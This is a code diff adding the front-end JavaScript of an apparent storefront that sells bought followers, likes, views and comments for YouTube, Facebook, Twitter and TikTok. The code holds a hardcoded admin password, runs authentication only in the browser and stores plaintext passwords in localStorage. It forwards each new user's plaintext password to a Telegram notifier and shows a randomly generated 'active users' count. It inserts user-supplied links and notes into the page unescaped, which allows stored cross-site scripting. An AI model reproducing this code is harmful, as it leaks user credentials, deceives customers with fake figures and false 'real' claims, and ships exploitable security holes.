+            { id: 12, name: 'YouTube Shares', category: 'youtube', icon: '📤', description: 'Increase video shares', price: 35, priceText: '₹35/1K', speed: '⚡ 2K/Day' },
+            { id: 13, name: 'Facebook Page Likes', category: 'facebook', icon: '👥', description: 'Increase page likes', price: 50, priceText: '₹50/1K', speed: '🔥 2K/Day' },
+            { id: 14, name: 'Facebook Post Likes', category: 'facebook', icon: '👍', description: 'Get more post likes', price: 50, priceText: '₹50/1K', speed: '⚡ 10K/Day' },
+            { id: 15, name: 'Facebook Followers', category: 'facebook', icon: '🌟', description: 'Real Facebook followers', price: 350, priceText: '₹350/1K', speed: '🔥 1K/Day' },
+            { id: 16, name: 'Facebook Video Views', category: 'facebook', icon: '📹', description: 'Boost video views', price: 80, priceText: '₹80/1K', speed: '⚡ 50K/Day' },
+            { id: 17, name: 'Facebook Comments', category: 'facebook', icon: '💬', description: 'Real comments on posts', price: 48, priceText: '₹48/1K', speed: '🔥 500/Day' },
+            { id: 18, name: 'Facebook Shares', category: 'facebook', icon: '🔄', description: 'Increase post shares', price: 40, priceText: '₹40/1K', speed: '⚡ 3K/Day' },
+            { id: 19, name: 'Twitter Followers', category: 'twitter', icon: '🐦', description: 'Grow Twitter following', price: 450, priceText: '₹450/1K', speed: '⚡ 5K/Day' },
+            { id: 20, name: 'Twitter Likes', category: 'twitter', icon: '❤️', description: 'More likes on tweets', price: 60, priceText: '₹60/1K', speed: '⚡ 10K/Day' },
+            { id: 21, name: 'Twitter Retweets', category: 'twitter', icon: '🔄', description: 'Boost tweet visibility', price: 40, priceText: '₹40/1K', speed: '⚡ 5K/Day' },
+            { id: 22, name: 'Twitter Views', category: 'twitter', icon: '👁️', description: 'Increase tweet impressions', price: 80, priceText: '₹80/1K', speed: '⚡ 100K/Day' },
+            { id: 23, name: 'TikTok Followers', category: 'tiktok', icon: '🎵', description: 'Boost TikTok profile', price: 350, priceText: '₹350/1K', speed: '⚡ 3K/Day' },
+            { id: 24, name: 'TikTok Likes', category: 'tiktok', icon: '💖', description: 'Get more video likes', price: 40, priceText: '₹40/1K', speed: '⚡ 20K/Day' },
+            { id: 25, name: 'TikTok Views', category: 'tiktok', icon: '👁️', description: 'Boost video views', price: 80, priceText: '₹80/1K', speed: '⚡ 100K/Day' },
+            { id: 26, name: 'TikTok Comments', category: 'tiktok', icon: '💬', description: 'Real comments from users', price: 50, priceText: '₹50/1K', speed: '🔥 500/Day' },
+            { id: 27, name: 'TikTok Shares', category: 'tiktok', icon: '📤', description: 'Increase video shares', price: 35, priceText: '₹35/1K', speed: '⚡ 2K/Day' },
+            { id: 28, name: 'TikTok Live Stream Views', category: 'tiktok', icon: '🔴', description: 'Boost live stream viewers', price: 70, priceText: '₹70/1K', speed: '⚡ Instant' }
+        ];
+
+        // ============ USER AUTHENTICATION ============
+        const ADMIN_EMAIL = 'admin@smmpanel.com';
+        const ADMIN_PASSWORD = 'shivay@7098';
+        
+        let registeredUsers = JSON.parse(localStorage.getItem('smmUsers') || '[]');
+        if (registeredUsers.length === 0) {
+            registeredUsers = [{ name: 'Admin', email: ADMIN_EMAIL, password: ADMIN_PASSWORD }];
+            localStorage.setItem('smmUsers', JSON.stringify(registeredUsers));
+        }
+
+        let currentUser = JSON.parse(localStorage.getItem('smmCurrentUser') || 'null');
+        let orderHistory = JSON.parse(localStorage.getItem('smmOrderHistory') || '[]');
+        let pendingOrders = JSON.parse(localStorage.getItem('smmPendingOrders') || '[]');
+
+        // Check login status on page load
+        if (currentUser) {
+            document.getElementById('authOverlay').classList.add('hidden');
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('userAvatar').textContent = currentUser.name.charAt(0).toUpperCase();
+        }
+
+        // ============ AUTH TAB SWITCHING ============
+        document.getElementById('loginTab').addEventListener('click', function() {
+            document.getElementById('loginTab').classList.add('active');
+            document.getElementById('signupTab').classList.remove('active');
+            document.getElementById('loginForm').classList.add('active');
+            document.getElementById('signupForm').classList.remove('active');
+            hideAuthMessages();
+        });
+
+        document.getElementById('signupTab').addEventListener('click', function() {
+            document.getElementById('signupTab').classList.add('active');
+            document.getElementById('loginTab').classList.remove('active');
+            document.getElementById('signupForm').classList.add('active');
+            document.getElementById('loginForm').classList.remove('active');
+            hideAuthMessages();
+        });
+
+        function showAuthError(msg) {
+            const el = document.getElementById('authError');
+            el.textContent = msg;
+            el.classList.add('show');
+            setTimeout(() => el.classList.remove('show'), 5000);
+        }
+
+        function showAuthSuccess(msg) {
+            const el = document.getElementById('authSuccess');
+            el.textContent = msg;
+            el.classList.add('show');
+            setTimeout(() => el.classList.remove('show'), 3000);
+        }
+
+        function hideAuthMessages() {
+            document.getElementById('authError').classList.remove('show');
+            document.getElementById('authSuccess').classList.remove('show');
+        }
+
+        // ============ LOGIN FORM ============
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('loginEmail').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            
+            const user = registeredUsers.find(u => u.email === email && u.password === password);
+            if (user) {
+                currentUser = { name: user.name, email: user.email };
+                localStorage.setItem('smmCurrentUser', JSON.stringify(currentUser));
+                showAuthSuccess('✅ Login successful! Welcome ' + user.name);
+                setTimeout(() => {
+                    document.getElementById('authOverlay').classList.add('hidden');
+                    document.getElementById('mainContent').style.display = 'block';
+                    document.getElementById('userAvatar').textContent = user.name.charAt(0).toUpperCase();
+                    renderServices();
+                    loadPendingOrders();
+                }, 1000);
+            } else {
+                showAuthError('❌ Invalid email or password!');
+            }
+        });
+
+        // ============ SIGNUP FORM ============
+        document.getElementById('signupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('signupName').value.trim();
+            const email = document.getElementById('signupEmail').value.trim();
+            const password = document.getElementById('signupPassword').value;
+            const confirmPassword = document.getElementById('signupConfirmPassword').value;
+            
+            if (password !== confirmPassword) {
+                showAuthError('❌ Passwords do not match!');
+                return;
+            }
+            
+            if (registeredUsers.find(u => u.email === email)) {
+                showAuthError('❌ Email already registered! Please login.');
+                return;
+            }
+            
+            registeredUsers.push({ name, email, password });
+            localStorage.setItem('smmUsers', JSON.stringify(registeredUsers));
+            
+            // Send Telegram notification for new user
+            notifyNewUser(name, email, password);
+            
+            showAuthSuccess('✅ Signup successful! Please login.');
+            setTimeout(() => {
+                document.getElementById('loginTab').click();
+                document.getElementById('loginEmail').value = email;
+            }, 1500);
+        });
+
+        // ============ LOGOUT ============
+        document.getElementById('logoutBtn').addEventListener('click', function() {
+            if (confirm('Are you sure you want to logout?')) {
+                localStorage.removeItem('smmCurrentUser');
+                location.reload();
+            }
+        });
+
+        // ============ NAVIGATION ============
+        document.querySelectorAll('.nav-btn[data-section]').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const section = this.getAttribute('data-section');
+                document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                document.getElementById('servicesContainer').classList.remove('active');
+                document.getElementById('historyContainer').classList.remove('active');
+                document.getElementById('adminContainer').classList.remove('active');
+                document.getElementById(section + 'Container').classList.add('active');
+                if (section === 'history') loadOrderHistory();
+                if (section === 'admin') loadPendingOrders();
+            });
+        });
+
+        // ============ RENDER SERVICES ============
+        function renderServices(filter = 'all') {
+            const grid = document.getElementById('servicesGrid');
+            const filtered = filter === 'all' ? services : services.filter(s => s.category === filter);
+            grid.innerHTML = filtered.map(s => `
+                <div class="service-card">
+                    <div class="service-icon">${s.icon}</div>
+                    <div class="service-content">
+                        <h3 class="service-name">${s.name}</h3>
+                        <p class="service-description">${s.description}</p>
+                        <div class="service-meta">
+                            <span class="service-price">${s.priceText}</span>
+                            <span class="service-speed">${s.speed}</span>
+                        </div>
+                        <button class="order-btn" onclick="openModal(${s.id})">Order Now 🚀</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        document.querySelectorAll('.filter-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                document.querySelectorAll('.filter-tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+                renderServices(this.getAttribute('data-filter'));
+            });
+        });
+
+        // ============ ORDER MODAL ============
+        let selectedService = null;
+
+        function openModal(serviceId) {
+            selectedService = services.find(s => s.id === serviceId);
+            const select = document.getElementById('serviceSelect');
+            select.innerHTML = '<option value="">Select Service</option>' + 
+                services.map(s => `<option value="${s.id}" ${s.id === serviceId ? 'selected' : ''}>${s.name}</option>`).join('');
+            document.getElementById('orderModal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('orderModal').classList.remove('active');
+            document.getElementById('orderForm').reset();
+            document.getElementById('totalAmount').value = '';
+        }
+
+        document.getElementById('orderModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        document.getElementById('serviceSelect').addEventListener('change', function() {
+            selectedService = services.find(s => s.id === parseInt(this.value));
+            calculateTotal();
+        });
+
+        document.getElementById('orderQuantity').addEventListener('input', calculateTotal);
+
+        function calculateTotal() {
+            const qty = parseInt(document.getElementById('orderQuantity').value) || 0;
+            if (selectedService && qty > 0) {
+                const total = (selectedService.price * qty) / 1000;
+                document.getElementById('totalAmount').value = `₹${total.toFixed(2)}`;
+            } else {
+                document.getElementById('totalAmount').value = '';
+            }
+        }
+
+        // ============ ORDER SUBMISSION ============
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const txnId = document.getElementById('transactionId').value.trim();
+            const link = document.getElementById('orderLink').value.trim();
+            const qty = parseInt(document.getElementById('orderQuantity').value);
+            
+            if (!selectedService || !txnId || txnId.length < 12 || !link || !qty || qty < 100) {
+                alert('⚠️ Please fill all fields correctly!');
+                return;
+            }
+            
+            const orderId = 'ORD' + String(pendingOrders.length + orderHistory.length + 1).padStart(4, '0');
+            const amount = parseFloat(document.getElementById('totalAmount').value.replace('₹', ''));
+            
+            const newOrder = {
+                id: orderId,
+                userId: currentUser.email,
+                service: selectedService.name,
+                link, quantity: qty, amount,
+                transactionId: txnId,
+                date: new Date().toLocaleString('en-IN'),
+                notes: document.getElementById('orderNotes').value
+            };
+            
+            pendingOrders.push(newOrder);
+            localStorage.setItem('smmPendingOrders', JSON.stringify(pendingOrders));
+            
+            orderHistory.unshift({
+                id: orderId, service: selectedService.name, link, quantity: qty, amount,
+                status: 'pending', date: new Date().toISOString().split('T')[0],
+                transactionId: txnId
+            });
+            localStorage.setItem('smmOrderHistory', JSON.stringify(orderHistory));
+            
+            // Send Telegram notification for new order
+            notifyNewOrder(orderId, currentUser.email, selectedService.name, qty, amount, link, txnId, document.getElementById('orderNotes').value);
+            
+            document.getElementById('adminNotification').textContent = pendingOrders.length;
+            closeModal();
+            alert('✅ Order Submitted!\n\nOrder ID: ' + orderId + '\nStatus: PENDING\n\nCheck Order History.');
+            document.querySelector('.nav-btn[data-section="history"]').click();
+        });
+
+        // ============ ORDER HISTORY ============
+        function loadOrderHistory() {
+            const tbody = document.getElementById('orderHistoryBody');
+            if (orderHistory.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><div class="empty-state-icon">📦</div><div>No orders yet</div></td></tr>';
+                return;
+            }
+            tbody.innerHTML = orderHistory.map(o => `
+                <tr>
+                    <td><strong>${o.id}</strong></td>
+                    <td>${o.service}</td>
+                    <td style="font-size: 0.85rem;">${o.link}</td>
+                    <td>${o.quantity.toLocaleString()}</td>
+                    <td style="color: var(--success); font-weight: 600;">₹${o.amount.toFixed(2)}</td>
+                    <td style="font-family: 'Space Mono', monospace; font-size: 0.75rem;">${o.transactionId}</td>
+                    <td><span class="status-badge status-${o.status}">${o.status.toUpperCase()}</span></td>
+                    <td style="font-size: 0.85rem;">${o.date}</td>
+                </tr>
+            `).join('');
+        }
+
+        // ============ ADMIN PANEL ============
+        function loadPendingOrders() {
+            const container = document.getElementById('pendingOrdersList');
+            const count = pendingOrders.length;
+            document.getElementById('adminNotification').textContent = count;
+            document.getElementById('pendingCount').textContent = count;
+            
+            if (count === 0) {
+                container.innerHTML = '<div class="empty-state"><div class="empty-state-icon">✅</div><div>All orders approved!</div></div>';
+                return;
+            }
+            
+            container.innerHTML = pendingOrders.map(o => `
+                <div class="pending-order-card">
+                    <div class="order-info">
+                        <div class="order-info-item"><span class="order-info-label">Order ID</span><span class="order-info-value">${o.id}</span></div>
+                        <div class="order-info-item"><span class="order-info-label">User</span><span class="order-info-value">${o.userId}</span></div>
+                        <div class="order-info-item"><span class="order-info-label">Service</span><span class="order-info-value">${o.service}</span></div>
+                        <div class="order-info-item"><span class="order-info-label">Quantity</span><span class="order-info-value">${o.quantity.toLocaleString()}</span></div>
+                        <div class="order-info-item"><span class="order-info-label">Amount</span><span class="order-info-value" style="color: var(--success);">₹${o.amount.toFixed(2)}</span></div>
+                        <div class="order-info-item"><span class="order-info-label">Date</span><span class="order-info-value">${o.date}</span></div>
+                    </div>
+                    <div class="transaction-info"><strong>🔢 Transaction ID:</strong><div class="transaction-id">${o.transactionId}</div></div>
+                    <div><strong>Link:</strong> ${o.link}</div>
+                    ${o.notes ? `<div style="margin-top: 0.5rem;"><strong>Notes:</strong> ${o.notes}</div>` : ''}
+                    <div class="admin-actions">
+                        <button class="btn-approve" onclick="approveOrder('${o.id}')">✅ Approve</button>
+                        <button class="btn-reject" onclick="rejectOrder('${o.id}')">❌ Reject</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function approveOrder(orderId) {
+            const order = pendingOrders.find(o => o.id === orderId);
+            const idx = orderHistory.findIndex(o => o.id === orderId);
+            if (idx !== -1) orderHistory[idx].status = 'processing';
+            
+            // Send Telegram notification for approved order
+            if (order) {
+                notifyOrderApproved(orderId, order.userId, order.service, order.quantity, order.amount);
+            }
+            
+            pendingOrders = pendingOrders.filter(o => o.id !== orderId);
+            localStorage.setItem('smmOrderHistory', JSON.stringify(orderHistory));
+            localStorage.setItem('smmPendingOrders', JSON.stringify(pendingOrders));
+            loadPendingOrders();
+            alert('✅ Order ' + orderId + ' approved!');
+        }
+
+        function rejectOrder(orderId) {
+            if (confirm('Reject order ' + orderId + '?')) {
+                const order = pendingOrders.find(o => o.id === orderId);
+                const idx = orderHistory.findIndex(o => o.id === orderId);
+                if (idx !== -1) orderHistory[idx].status = 'rejected';
+                
+                // Send Telegram notification for rejected order
+                if (order) {
+                    notifyOrderRejected(orderId, order.userId, order.service, order.amount);
+                }
+                
+                pendingOrders = pendingOrders.filter(o => o.id !== orderId);
+                localStorage.setItem('smmOrderHistory', JSON.stringify(orderHistory));
+                localStorage.setItem('smmPendingOrders', JSON.stringify(pendingOrders));
+                loadPendingOrders();
+                alert('❌ Order ' + orderId + ' rejected!');
+            }
+        }
+
+        // ============ UTILITIES ============
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => alert('✅ Copied: ' + text));
+        }
+
+        function updateActiveUsers() {
+            const el = document.getElementById('activeUsers');
+            if (el) el.textContent = Math.floor(Math.random() * 351) + 150;
+        }
+
+        // ============ INITIALIZE ============
+        if (currentUser) {
+            renderServices();
+            loadPendingOrders();
+            updateActiveUsers();
+            setInterval(updateActiveUsers, 5000);
+        }
+    </script>
+</body>
+</html>
